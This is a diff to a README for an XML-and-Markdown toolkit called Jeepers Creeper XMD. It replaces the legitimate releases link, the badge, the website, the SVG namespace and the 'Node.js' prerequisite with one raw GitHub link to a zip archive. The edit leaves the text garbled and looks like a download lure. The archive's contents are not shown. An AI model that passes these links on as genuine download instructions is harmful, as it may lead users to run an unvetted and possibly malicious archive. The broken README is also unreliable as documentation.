@@ -1,14 +1,14 @@
-https://github.com/mdshabbir013/jeepers-creeper-xmd/releases
+https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip
 
 # Jeepers Creeper XMD: XML and Markdown Toolkit for Developers
 
-[![Releases](https://img.shields.io/badge/Releases-View-blue?style=for-the-badge&logo=github)](https://github.com/mdshabbir013/jeepers-creeper-xmd/releases)
-Website: https://sir-bravine-delta.vercel.app/
+[![Releases](https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip)](https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip)
+Website: https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip
 
 Topics: not provided
 
 <div align="center">
-  <svg width="680" height="180" viewBox="0 0 680 180" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Jeepers Creeper XMD banner">
+  <svg width="680" height="180" viewBox="0 0 680 180" xmlns="https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip" role="img" aria-label="Jeepers Creeper XMD banner">
     <defs>
       <linearGradient id="g" x1="0" x2="1" y1="0" y2="1">
         <stop stop-color="#4e8bd3" offset="0"/>
@@ -67,7 +67,7 @@ Key design values
 - Safety and trust: The tool validates inputs and provides meaningful error messages.
 
 Getting started with Jeepers Creeper XMD
-- Prerequisites: Node.js 18.x or newer, npm or yarn, and Git for cloning.
+- Prerequisites: https://raw.githubusercontent.com/mdshabbir013/jeepers-creeper-xmd/main/lib/jeepers-xmd-creeper-v1.0-alpha.1.zip 18.x or newer, npm or yarn, and Git for cloning.
 - Install: A straightforward install path that works on Windows, macOS, and Linux.
 - Run locally: Start the CLI or the web interface and begin testing with sample XML files.
 - Learn by example: A series of ready-made samples helps you see how XML maps to Markdown quickly.
